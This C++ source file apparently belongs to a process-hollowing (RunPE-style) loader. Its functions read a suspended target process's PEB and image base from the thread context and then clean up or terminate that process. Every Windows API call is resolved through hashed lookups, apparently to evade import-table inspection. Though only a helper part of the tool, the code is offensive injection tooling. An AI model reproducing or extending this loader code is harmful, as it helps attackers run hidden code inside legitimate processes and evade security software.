#include "process.hpp"

/**
 * Function to retrieve the PEB address and image base address of the target process x86.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	m_wow64GetThreadContextPtr wow64GetThreadContext = (m_wow64GetThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 965724701);
	wow64GetThreadContext(lpPI->hThread, &CTX);
	// ReadProcessMemory
	m_ReadProcessMemoryPtr readProcessMemory = (m_ReadProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 848101123);
	const BOOL bReadBaseAddress = readProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{nullptr, nullptr};

	return ProcessAddressInformation{(LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress};
}

/**
 * Function to retrieve the PEB address and image base address of the target process x64.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	LPVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	m_getThreadContextPtr getThreadContext = (m_getThreadContextPtr)m_GetProcAddressEx("kernel32.dll", 981130953);
	getThreadContext(lpPI->hThread, &CTX);
	m_ReadProcessMemoryPtr readProcessMemory = (m_ReadProcessMemoryPtr)m_GetProcAddressEx("kernel32.dll", 848101123);
	const BOOL bReadBaseAddress = readProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	if (!bReadBaseAddress)
		return ProcessAddressInformation{nullptr, nullptr};

	return ProcessAddressInformation{(LPVOID)CTX.Rdx, lpImageBaseAddress};
}

/**
 * Function to clean and exit target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
	{
		m_terminateProcessPtr terminateProcess = (m_terminateProcessPtr)m_GetProcAddressEx("kernel32.dll", 126253886);
		terminateProcess(lpPI->hProcess, -1);
		CloseHandle(lpPI->hProcess);
	}
}

/**
 * Function to clean the target process.
 * \param lpPI : pointer to PROCESS_INFORMATION of the target process.
 * \param hFileContent : handle of the source image content.
 */
void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent)
{
	if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
		HeapFree(GetProcessHeap(), 0, hFileContent);

	if (lpPI->hThread != nullptr)
		CloseHandle(lpPI->hThread);

	if (lpPI->hProcess != nullptr)
		CloseHandle(lpPI->hProcess);
}